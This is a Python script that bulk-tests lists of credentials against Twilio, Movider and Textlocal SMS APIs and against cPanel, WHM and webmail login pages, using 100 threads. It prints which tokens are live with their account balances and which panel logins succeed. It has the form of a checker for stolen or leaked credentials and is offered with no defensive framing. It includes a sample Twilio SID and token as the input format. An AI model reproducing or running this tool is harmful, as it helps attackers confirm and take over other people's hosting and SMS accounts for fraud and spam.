import requests
import console
from re import findall as reg
from concurrent.futures import ThreadPoolExecutor
import urllib.request
import urllib.parse

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

requests.packages.urllib3.disable_warnings()

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

def checktwillio(inp):
    try:
        sid , token = str(inp).split('|')
        status = 'OFFLINE'
        url = 'https://api.twilio.com'
        check = '/2010-04-01/Accounts.json'
        response = requests.get(url + check, auth=('{}'.format(sid), '{}'.format(token))).text
        if '"message":"Authenticat' not in str(response):
            status = reg('"status": "(.*?)"',response)[0]
            type = reg('"type": "(.*?)"',response)[0]
            balancepath = reg('"balance": "(.*?)"',response)[0]
            response = requests.get(url + balancepath, auth=('{}'.format(sid), '{}'.format(token))).text
            if '"status":' not in str(response):
                balance = reg('"balance": "(.*?)"',response)[0]
                currency = reg('"currency": "(.*?)"',response)[0]
            if status.lower() == 'active':
                print(f'{fw}[{fg}+{fw}] SID : {fr}{sid}{fw}\n{fw}[{fg}+{fw}] TOKEN : {fr}{token}{fw}\n{fw}[{fg}+{fw}] TYPE : {fg}{type}{fw}\n{fw}[{fg}+{fw}] STATUS : {fg}{status}{fw}\n{fw}[{fg}+{fw}] BALANCE : {fg}{balance} {currency}{fw}')
            else:
                print(f'{fw}[{fg}+{fw}] SID : {fr}{sid}{fw}\n{fw}[{fg}+{fw}] TOKEN : {fr}{token}{fw}\n{fw}[{fg}+{fw}] TYPE : {fg}{type}{fw}\n{fw}[{fg}+{fw}] STATUS : {fr}{status}{fw}\n{fw}[{fg}+{fw}] BALANCE : {fg}{balance} {currency}{fw}')
        else:
            print(f'{fw}[{fg}+{fw}] SID : {fr}{sid}{fw}\n{fw}[{fg}+{fw}] TOKEN : {fr}{token}{fw}\n{fw}[{fg}+{fw}] STATUS : {fr}{status}{fw}')
    except:
        pass

def checkmovider(inp):
    try:
        key , secret = str(inp).split('|')
        url = "https://api.movider.co/v1/balance"
        payload = "api_key={}&api_secret={}".format(key,secret)
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded"
        }
        response = requests.post(url, data=payload, headers=headers).text
        if 'amount' in str(response):
            type_ = reg('{"type":"(.*?)",',str(response))[0]
            amount = reg('amount":(.*?)}',str(response))[0]
            print('{}[{}+{}] Key : {}{}\n{}[{}+{}] Secret : {}{}\n{}[{}+{}] Balance : {}{} {}{}\n'.format(fw,fg,fw,fr,key,fw,fg,fw,fr,secret,fw,fg,fw,fr,amount,type_,fw))
    except:
        pass

def checktextlocal(apikey):
    try:
        data =  urllib.parse.urlencode({'apikey': apikey})
        data = data.encode('utf-8')
        request = urllib.request.Request("https://api.textlocal.in/balance/?")
        f = urllib.request.urlopen(request, data).read()
        balance = reg('{"sms":(.*?)}',str(f))[0]
        print('{}[{}+{}] Key : {}{}{}\n[{}+{}] Balance : {}{} SMS{}'.format(fw,fg,fw,fr,apikey,fw,fg,fw,fr,balance,fw))
    except:
        pass

def checkcpanel(string):
    try:
        string = str(string).split('|')
        link = str(string[0]).strip()
        user = str(string[1]).strip()
        pwd = str(string[2]).strip()
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2082' not in str(link) and ':2083' not in str(link):
            link = str(link) + ':2083'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'cpanel</title' in str(req.text).lower() or 'title>cpanel' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        pass

def checkwhm(string):
    try:
        string = str(string).split('|')
        link = str(string[0]).strip()
        user = str(string[1]).strip()
        pwd = str(string[2]).strip()
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2086' not in str(link) and ':2087' not in str(link):
            link = str(link) + ':2087'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'whm</title' in str(req.text).lower() or 'title>whm' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        pass

def checkwebmail(string):
    try:
        string = str(string).split('|')
        link = str(string[0]).strip()
        user = str(string[1]).strip()
        pwd = str(string[2]).strip()
        if 'http' not in str(link):
            link = 'http://' + str(link)
        if ':2095' not in str(link) and ':2096' not in str(link):
            link = str(link) + ':2096'
        try:
            req = requests.get(link , headers=headers , timeout = 5)
            if 'whm</title' in str(req.text).lower() or 'title>whm' in str(req.text).lower():
                if str(req.url) != str(link):
                    link = str(req.url)
            payload = {
                'user': '{}'.format(user),
                'pass': '{}'.format(pwd),
                'goto_uri': '/'
            }
            login = requests.post(link + '/login/?login_only=1' , headers = headers ,data = payload, timeout = 8).text
            string = '{}|{}|{}'.format(link,user,pwd)
            if 'security_token' in str(login):
                print('\u001b[42;1mSUCCESS\u001b[0m {}'.format(string))
            else:
                print('\u001b[41;1mWRONG CREDS\u001b[0m {}'.format(string))
        except:
            string = '{}|{}|{}'.format(link,user,pwd)
            print('\u001b[41;1mERROR\u001b[0m {}'.format(string))
    except:
        pass

def twillio():
    print('{}[{}!{}]{} FORMAT : {}SID|TOKEN|NUMBER{} or {}SID|TOKEN{} \n{}[{}!{}]{} EXEMPLE : {}AC7158229bc7212e073d22836c31043603{}|{}5375ad12e0feb05d9a3f1402e3974720{}'.format(flc,fr,flc,fw,fg,fw,fg,fw,flc,fr,flc,fw,fg,fw,fg,fw))
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checktwillio,lista)
    except:
        pass

def movider():
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkmovider,lista)
    except:
        pass

def textlocal():
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checktextlocal,lista)
    except:
        pass

def cpanel():
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkcpanel,lista)
    except:
        pass

def whm():
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkwhm,lista)
    except:
        pass

def webmail():
    lista = list(x.strip() for x in open(input('{}[{}!{}] Input List : '),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(checkwebmail,lista)
    except:
        pass